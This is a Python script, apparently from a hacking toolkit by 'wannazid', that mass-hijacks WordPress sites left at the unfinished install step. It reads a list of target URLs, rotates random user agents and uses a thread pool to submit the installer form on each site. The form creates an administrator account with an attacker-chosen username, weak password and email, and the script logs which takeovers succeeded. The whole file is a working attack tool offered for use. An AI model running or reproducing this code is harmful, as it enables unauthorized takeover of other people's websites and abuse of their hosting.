# WP Installer by wannazid
import requests, random
from menu.main import *
from concurrent.futures import ThreadPoolExecutor

red = "\033[31;1m"
green = "\033[32;1m"
yellow = "\033[33;1m"
white = "\033[37;1m"
normal = "\033[37;0m"

class WPInstall:
	def __init__(self, target):
		self.target = target
		self.user_agent()
		self.agent()
		self.auto_wp_install()
		
	def user_agent(self):
		ua = open('user-agents.txt','r').read().splitlines()
		return random.choice(ua)
		
	def agent(self):
		agents = {'User-Agent':self.user_agent()}
		return agents
		
	def auto_wp_install(self):
		try:
			for _ in ' ':
				title = 'Tes Site' # Ubah Sesuai Kalian
				username = 'admin' # Ubah Sesuai Kalian
				password = 'wannazid5550' # Ubah Sesuai Kalian
				email = 'wan505055@gmail.com' # Ubah Sesuai Kalian
				sub = 'submit'
				
				uagent = self.agent()
				r = requests.Session()
				site = self.target.replace('/wp-admin/install.php?step=2','')
				http_data = {
				'weblog_title':title,
				'user_name':username,
				'admin_password':password,
				'admin_password2':password,
				'pw_weak':1,
				'admin_email':email,
				'blog_public':0,
				'submit':sub
				}
				req = r.post(self.target, headers=uagent, data=http_data).text
				if f'<a href="{site}/wp-login.php" class="button button-large">' in req:
					print(f'{green}[+] {self.target} > Succes Install{normal}')
					open('Succes Install.txt','a').write(self.target+'\n')
				else:
					print(f'{red}[+] {self.target} > Failed Install : Database Error{normal}')
					open('Failed Install.txt','a').write(self.target+'\n')
		except:
			print(f'{yellow}[!] {self.target} > Website Error, Network Error or HTTP Error{normal}')
			open('Error Site.txt','a').write(self.target+'\n')

if __name__ == '__main__':
	
	wannazid = home()
	print(f'{green}{wannazid}{normal}')
	select_tools = input(f'{white}~#> Select Tools (1/2) : {normal}')
	
	if select_tools == '1':
		print(f'''{yellow}
           ___  
       _,-' ______
     .'  .-'  ____7
    /   /   ___7
  _|   /  ___7    ~ Auto Install Wordpress ~
>(')\ | ___7    by : wannazid
  \\/     \_______
  '        _======>
  `'----\\`
			''')
		input_list = input('~#> List Site + Path Step 2 : ')
		input_thread = input('~#> Thread : ')
		print(normal)
		open_site = open(input_list,'r').read().splitlines()
		with ThreadPoolExecutor(max_workers=int(input_thread)) as t:
			[t.submit(WPInstall, site) for site in open_site]
	elif select_tools == '2':
		print('~#> Coming Soon!')
	else:
		print(f'{red}[!] Not Found Your Chose Tools!{normal}')
		
		
